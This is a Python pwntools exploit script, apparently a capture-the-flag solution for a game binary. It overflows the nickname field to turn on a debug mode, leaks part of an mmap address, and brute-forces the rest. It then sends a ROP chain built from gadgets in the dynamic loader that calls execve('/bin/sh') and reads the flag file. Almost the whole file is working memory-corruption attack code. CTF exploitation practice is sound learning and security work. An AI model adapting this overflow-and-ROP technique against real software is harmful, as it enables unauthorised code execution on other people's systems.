#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# tbreak main
# b user_setup
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

sa(b'Nick: ', flat(
    b'A' * 0x20,        # filling name array
    cyclic(0x28, n=8),  # padding to enable debug mode
    1,                  # debug mode
))

ru(b'score: ')
partial_mmap_leak = rl().decode().strip()
partial_mmap_leak = int(partial_mmap_leak) >> 1
success(f"Partial mmap leak: {partial_mmap_leak:#x}")

ld = ELF('./ld-linux-x86-64.so.2')

for high in range(0x6, 0x10):
    for low in range(0, 0x10):
        # local development
        # high = 0x7f
        # low = 0x8

        mmap_addr = high << 44 | partial_mmap_leak << 16 | low << 12
        info(f'Trying mmap addr: {mmap_addr:#x}')
        
        ld.address = mmap_addr + 0x9000

        ld_rop = ROP(ld)
        pop_rdi_rbp_ret = ld_rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])[0]
        pop_rsi_rbp_ret = ld_rop.find_gadget(['pop rsi', 'pop rbp', 'ret'])[0]
        pop_rax_ret = ld_rop.find_gadget(['pop rax', 'ret'])[0]

        # 0x0002e22a: add rsp, 0x30; ret;
        add_rsp_30_ret = ld.address + 0x2e22a

        # 0x000077c5: pop rdx; add eax, [rax]; add bl, al; nop [rax+rax]; ret;
        pop_rdx_ret = ld.address + 0x77c5

        # 0x00028fa9: syscall; ret;
        syscall_ret = ld.address + 0x28fa9

        color_payload_addr = mmap_addr + 0x80
        color_payload = b'/bin/sh\x00'

        sc = flat(
            # set rdx
            pop_rax_ret,
            mmap_addr+0xf00,

            pop_rdx_ret,
            color_payload_addr + 8,


            # set rsi
            pop_rsi_rbp_ret,
            color_payload_addr + 8,
            0,

            # set rdi
            pop_rdi_rbp_ret,
            color_payload_addr,
            0,

            pop_rax_ret,
            0x3b,

            syscall_ret,
        )

        assert len(color_payload) <= 0x28, "Color payload too long"

        sleep(0.5)

        # name data was strduped and is located at 0x600
        s(flat({
        # sa(b'Nick:', flat({
            # free space
            0x28: color_payload_addr,    # color ptr, this is where read call will write
            0x30: color_payload_addr-8,  # rbp
            0x38: add_rsp_30_ret,        # rbp = [rbp], rsp=rbp+8, 
            0x40: mmap_addr+0x600,       # alloc_ptr -> strdup will allocate from there and copy our name (this payload)
            0x70: sc
        }))

        ru(b'Color: ')
        s(color_payload)
    
        won = ru(b'Battle begins', timeout=0.2)
        if won != b'':
            ia()
            sl(b'ls')
            sl(b'cat flag.txt')
            io.stream()
            exit(0)


error("Failed to find valid mmap address")

